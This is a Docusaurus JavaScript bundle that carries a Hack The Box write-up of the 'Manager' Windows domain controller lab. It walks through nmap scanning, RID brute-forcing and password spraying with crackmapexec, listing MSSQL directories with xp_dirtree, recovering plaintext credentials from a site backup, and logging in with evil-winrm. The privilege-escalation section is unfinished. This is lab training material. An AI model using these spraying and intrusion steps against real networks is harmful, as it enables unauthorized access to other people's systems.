"use strict";(self.webpackChunkdocs=self.webpackChunkdocs||[]).push([[3293],{6519:(e,n,o)=>{o.r(n),o.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"Hacking/Write-ups/Hack the box/medium/Manager","title":"Manager","description":"Enumeration","source":"@site/docs/Hacking/Write-ups/Hack the box/medium/Manager.md","sourceDirName":"Hacking/Write-ups/Hack the box/medium","slug":"/write-up/htb/medium/manager","permalink":"/docs/write-up/htb/medium/manager","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"slug":"/write-up/htb/medium/manager","pagination_next":null,"pagination_prev":null},"sidebar":"tutorialSidebar"}');var s=o(4848),t=o(8453);const i={slug:"/write-up/htb/medium/manager",pagination_next:null,pagination_prev:null},a=void 0,c={},d=[{value:"Enumeration",id:"enumeration",level:2},{value:"Foothold",id:"foothold",level:2},{value:"Lateral movement",id:"lateral-movement",level:2},{value:"Privilege escalation",id:"privilege-escalation",level:2}];function l(e){const n={code:"code",h2:"h2",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,s.jsx)(n.p,{children:"There are a lot of ports opened ..."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ nmap 10.10.11.236                 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 20:09 CET\nStats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan\nPing Scan Timing: About 50.00% done; ETC: 20:09 (0:00:02 remaining)\nNmap scan report for 10.10.11.236\nHost is up (0.045s latency).\nNot shown: 987 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n53/tcp open  domain  Simple DNS Plus\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n80/tcp open  http    Microsoft IIS httpd 10.0\n|_http-title: Manager\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nPORT   STATE SERVICE      VERSION\n88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-03 01:14:27Z)\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nPORT    STATE SERVICE VERSION\n135/tcp open  msrpc   Microsoft Windows RPC\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n139/tcp open  netbios-ssn Microsoft Windows netbios-ssn\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-01-03T01:17:01+00:00; +5h59m52s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\n445/tcp open  microsoft-ds?\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n|_clock-skew: 5h59m51s\n| smb2-time: \n|   date: 2024-01-03T01:17:48\n|_  start_date: N/A\n\n464/tcp  open  kpasswd5\n593/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\n636/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\n|_ssl-date: 2024-01-03T01:20:28+00:00; +5h59m52s from scanner time.\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 5h59m51s\n\n1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM\n|_ssl-date: 2024-01-03T01:21:19+00:00; +5h59m52s from scanner time.\n| ms-sql-info: \n|   10.10.11.236:1433: \n|     Version: \n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|_    TCP port: 1433\n| ms-sql-ntlm-info: \n|   10.10.11.236:1433: \n|     Target_Name: MANAGER\n|     NetBIOS_Domain_Name: MANAGER\n|     NetBIOS_Computer_Name: DC01\n|     DNS_Domain_Name: manager.htb\n|     DNS_Computer_Name: dc01.manager.htb\n|     DNS_Tree_Name: manager.htb\n|_    Product_Version: 10.0.17763\n| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback\n| Not valid before: 2023-12-21T20:26:45\n|_Not valid after:  2053-12-21T20:26:45\n\nHost script results:\n|_clock-skew: mean: 5h59m51s, deviation: 0s, median: 5h59m51s\n\n3268/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n|_ssl-date: 2024-01-03T01:22:42+00:00; +5h59m53s from scanner time.\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 5h59m52s\n\n\n3269/tcp open  ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=dc01.manager.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb\n| Not valid before: 2023-07-30T13:51:28\n|_Not valid after:  2024-07-29T13:51:28\n|_ssl-date: 2024-01-03T01:24:11+00:00; +5h59m52s from scanner time.\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n"})}),"\n",(0,s.jsx)(n.p,{children:"Samba is open, so we can enumerate the shares:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u2514\u2500$ smbclient -L \\\\dc01.manager.htb -N\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share \n        SYSVOL          Disk      Logon server share \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to dc01.manager.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n"})}),"\n",(0,s.jsx)(n.h2,{id:"foothold",children:"Foothold"}),"\n",(0,s.jsxs)(n.p,{children:["We can use ",(0,s.jsx)(n.code,{children:"crackmapexec"})," to brute-force the users:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'\u250c\u2500\u2500(gal\u327fgal)-[~/workspace/gal/htb]\n\u2514\u2500$ crackmapexec smb 10.10.11.236 -u anonymous -p "" --rid-brute 10000\nSMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.236    445    DC01             [+] manager.htb\\anonymous: \nSMB         10.10.11.236    445    DC01             [+] Brute forcing RIDs\nSMB         10.10.11.236    445    DC01             498: MANAGER\\Enterprise Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             500: MANAGER\\Administrator (SidTypeUser)\nSMB         10.10.11.236    445    DC01             501: MANAGER\\Guest (SidTypeUser)\nSMB         10.10.11.236    445    DC01             502: MANAGER\\krbtgt (SidTypeUser)\nSMB         10.10.11.236    445    DC01             512: MANAGER\\Domain Admins (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             513: MANAGER\\Domain Users (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             514: MANAGER\\Domain Guests (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             515: MANAGER\\Domain Computers (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             516: MANAGER\\Domain Controllers (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             517: MANAGER\\Cert Publishers (SidTypeAlias)\nSMB         10.10.11.236    445    DC01             518: MANAGER\\Schema Admins (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             519: MANAGER\\Enterprise Admins (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             520: MANAGER\\Group Policy Creator Owners (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             521: MANAGER\\Read-only Domain Controllers (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             522: MANAGER\\Cloneable Domain Controllers (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             525: MANAGER\\Protected Users (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             526: MANAGER\\Key Admins (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             527: MANAGER\\Enterprise Key Admins (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             553: MANAGER\\RAS and IAS Servers (SidTypeAlias)\nSMB         10.10.11.236    445    DC01             571: MANAGER\\Allowed RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.11.236    445    DC01             572: MANAGER\\Denied RODC Password Replication Group (SidTypeAlias)\nSMB         10.10.11.236    445    DC01             1000: MANAGER\\DC01$ (SidTypeUser)\nSMB         10.10.11.236    445    DC01             1101: MANAGER\\DnsAdmins (SidTypeAlias)\nSMB         10.10.11.236    445    DC01             1102: MANAGER\\DnsUpdateProxy (SidTypeGroup)\nSMB         10.10.11.236    445    DC01             1103: MANAGER\\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)\nSMB         10.10.11.236    445    DC01             1113: MANAGER\\Zhong (SidTypeUser)\nSMB         10.10.11.236    445    DC01             1114: MANAGER\\Cheng (SidTypeUser)\nSMB         10.10.11.236    445    DC01             1115: MANAGER\\Ryan (SidTypeUser)\nSMB         10.10.11.236    445    DC01             1116: MANAGER\\Raven (SidTypeUser)\nSMB         10.10.11.236    445    DC01             1117: MANAGER\\JinWoo (SidTypeUser)\nSMB         10.10.11.236    445    DC01             1118: MANAGER\\ChinHae (SidTypeUser)\nSMB         10.10.11.236    445    DC01             1119: MANAGER\\Operator (SidTypeUser)\n'})}),"\n",(0,s.jsx)(n.p,{children:"So far, we found the following users:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"zhong"}),"\n",(0,s.jsx)(n.li,{children:"cheng"}),"\n",(0,s.jsx)(n.li,{children:"ryan"}),"\n",(0,s.jsx)(n.li,{children:"raven"}),"\n",(0,s.jsx)(n.li,{children:"jinwoo"}),"\n",(0,s.jsx)(n.li,{children:"chinhae"}),"\n",(0,s.jsx)(n.li,{children:"operator"}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["We have a complete version number: ",(0,s.jsx)(n.code,{children:"Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)"})]}),"\n",(0,s.jsx)(n.p,{children:"Now we can do password spraying with the users:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users\n"})}),"\n",(0,s.jsxs)(n.p,{children:["And we found out the username and password for ",(0,s.jsx)(n.code,{children:"operator"}),":"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"SMB         10.10.11.236    445    DC01             [+] manager.htb\\operator:operator \n"})}),"\n",(0,s.jsx)(n.h2,{id:"lateral-movement",children:"Lateral movement"}),"\n",(0,s.jsx)(n.p,{children:"With that user we cannot do much, if we try to connect with evil-winrm, we will get connection refused."}),"\n",(0,s.jsx)(n.p,{children:"LDAP is opened, we can try to dump all the contents of it:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"ldapdomaindump 10.10.11.236 -u 'manager.htb\\operator' -p 'operator' --no-json --no-grep\n"})}),"\n",(0,s.jsx)(n.p,{children:"MS SQL is also open, so we can try to connect using the found user/password:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'.\n[*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL (MANAGER\\Operator  guest@master)> \n"})}),"\n",(0,s.jsx)(n.p,{children:"Here, it looks like we have permission to read the file structure:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"SQL (MANAGER\\Operator  guest@master)> EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1;\nsubdirectory                      depth   file   \n-------------------------------   -----   ----   \nabout.html                            1      1   \ncontact.html                          1      1   \ncss                                   1      0   \nimages                                1      0   \nindex.html                            1      1   \njs                                    1      0   \nservice.html                          1      1   \nweb.config                            1      1   \nwebsite-backup-27-07-23-old.zip       1      1   \n"})}),"\n",(0,s.jsx)(n.p,{children:"Now we have two interesting files to check: web.config and website-backup ..."}),"\n",(0,s.jsx)(n.p,{children:"The web.config is protected, so we can't download it, however we are able to download the backup..."}),"\n",(0,s.jsxs)(n.p,{children:["In the backup we can find the user and password for a user that is in the ",(0,s.jsx)(n.code,{children:"Remote Management Users"})," which sounds good..."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"<user>raven@manager.htb</user>\n<password>R4v3nBe5tD3veloP3r!123</password>\n"})}),"\n",(0,s.jsx)(n.p,{children:"With those credentials, we can use evil-winrm and get the user flag."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"evil-winrm -i dc01.manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'\n"})}),"\n",(0,s.jsx)(n.h2,{id:"privilege-escalation",children:"Privilege escalation"}),"\n",(0,s.jsx)(n.p,{children:"WIP"})]})}function p(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},8453:(e,n,o)=>{o.d(n,{R:()=>i,x:()=>a});var r=o(6540);const s={},t=r.createContext(s);function i(e){const n=r.useContext(t);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:i(e.components),r.createElement(t.Provider,{value:n},e.children)}}}]);